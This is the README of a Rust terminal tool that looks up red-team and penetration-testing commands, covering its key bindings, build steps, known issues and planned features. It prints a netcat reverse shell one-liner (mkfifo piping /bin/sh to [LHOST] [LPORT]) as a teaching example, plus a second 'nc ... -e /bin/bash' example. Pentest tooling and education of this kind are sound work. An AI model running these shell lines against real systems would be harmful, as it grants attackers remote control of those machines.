RTFM-RedOx is meant to be an easier to use and updated replacement for [RTFM](https://github.com/leostat/rtfm) (inspired by the book, Red Team Field Manual) as well as something that works similarly to [Rev Shells](https://revshells.com/) or the [HackTools](https://addons.mozilla.org/en-US/firefox/addon/hacktools/) browser plugin.  All without the need to leave your terminal to search through notes or open a browser window, or continually run a python script with a lot of switches you'll never remember.  It's basically like having a terminal history and history search for commands you never type in your terminal but often type when you have a shell on a remote host or when interacting with a vulnerable web app.  That being said, the database also contains many commands you'd also run on your local machine for things like nmap, impacket scripts (adding as I go), crackmapexec, and others.

As I've been working on this I've realized this can also be a good learning resource.  For example, the following reverse shell one liner has been used by many but is probably not all that well understood.
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [LHOST] [LPORT] >/tmp/f
```
0xdf has a [great video](https://www.youtube.com/watch?v=_q_ZCy-hEqg) that breaks down that command and explains it in detail. I will be updating references for commands in the database that include deep dive explanations, preferrably to video content, that provide a better understanding for more complex commands.  Any commands related to Kerberos, ADCS or Windows authentication in general will benefit from these types of external references to explainers.  The commands in the database from the original RTFM project do have links to websites and many of those are good but some need updating or additional references to more in depth explanations. 

I'm currently using the sqlite database that [RTFM](https://github.com/leostat/rtfm) uses but that hasn't been updated in almost 6 years so I will be gradually adding new commands and pushing the edited db file to the repository.    


## Usage
```
Ctrl+r           Enter quick search mode to dynamically find commands as you type.
Ctrl+c           Copy currently selected command to clipboard.
Ctrl+u           URL-encode and then copy currently selected command to clipboard.
Crtl+h or hist   Display selectable history of already selected commands.
Ctrl+v           Paste from clipboard
info             Display info on the currently selected command.
env              Show user variables that have already been set.
add -c           Add a command to the database e.g. 'add -c nc [LHOST] [LPORT] -e /bin/bash'
update           Update a database column in the selected command
                 e.g. comment, command, author or references
                 Example: update references http://blog.gregscharf.com
Esc              Exit current mode.
help             Display help
Ctrl+q or exit   Exit redOx.
```

![demo](./redox-demo.gif)


## To Use
```bash
#if you don't already have rust installed
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh

git clone https://github.com/gregscharf/RTFM-Redox.git
cd RTFM-Redox
cargo run --release
```

## Known Issues

**Debian distributions**: The linker will fail during the build process unless the following packages are installed.
```bash
sudo apt install libxcb1-dev libxcb-render0-dev libxcb-shape0-dev libxcb-xfixes0-dev
```

**Kali**: Sometimes the backspace/delete key requires Ctrl+Backspace/Delete to delete previous typed characters in the redox CLI. And in some cases Ctrl+h stops working, so I've added a 'hist' command for when that occurs until I figure out some of the intermittent key stroke issues. 

**Arch**: No known issues

**Mac M1**: Screen flicker when using up/down arrows 

**Windows**: Not supported because the Termion crate does not work on windows.  I'll be switching to crossterm at some point.


## To Add
- [x] After adding a new command to the db select it as the current command.
- [ ] Continue updating database with newer commands for things like Crackmapexec,ffuf,feroxbuster,Rubeus,Impacket, etc.
- [ ] Update command reference links to better and more up to date content, preferably adding links to video content when possible.
- [ ] Display ids next to references so that if necessary they can be deleted from the db through the redox CLI.  
- [ ] Add config file to store user set variables and other as yet to be determined configurations.
    - This might be the place for related commands that are often used together. Add ability to save the commands in the current history.  Would need a way to quickly delete a command in the current history e.g. highlight the command and then Ctrl+d to remove it. Also need to be able to completely clear the current history.  User would also need to supply a name for the history before it is saved to the config file.  These would be stored as an array of row IDs from TblCommand. Use the 'config' crate to facilitate this.  
- [ ] Ctrl+d while in selectable list deletes the item from the database, or if in history mode, deletes the item from the current history.
- [ ] Left/right arrow keys to edit already typed or pasted in command.  Really only useful when typing a long command to add to or update the database.
- [ ] Make use of tags already implemented in the database to display selectable list of grouped items. For example, 'reverse shells linux' to display all commands in the database grouped under that tag.  At the moment, tags already in the database are probably a little too general to be useful e.g. 'bash', 'windows'.  Also need a function to display all tags in the database as a selectable list.
- [ ] Implement [RTFM](https://github.com/leostat/rtfm)'s solution for creating/updating the database
- [ ] Tab auto complete for best match while in search mode.
- [ ] Switch from termion to crossterm for Windows support.
- [ ] Use pre-existing 'refs' table to link to markdown notes and display notes in terminal when selected.

## To Fix
- [x] Add buffer to scroll through result output that doesn't fit within terminal windows.
- [x] Handle error when output exceeds terminal window so application doesn't crash on Arch.
    - Needs a much better solution
- [ ] Sometimes backspace/delete key requires Ctrl+Backspace/Delete to delete typed character preceding cursor.
- [ ] Switch from termion to crossterm to add support for Windows consoles.      
- [ ] Switch to rusqlite and dump sqlx to avoid openssl static build nightmare to allow for release builds.

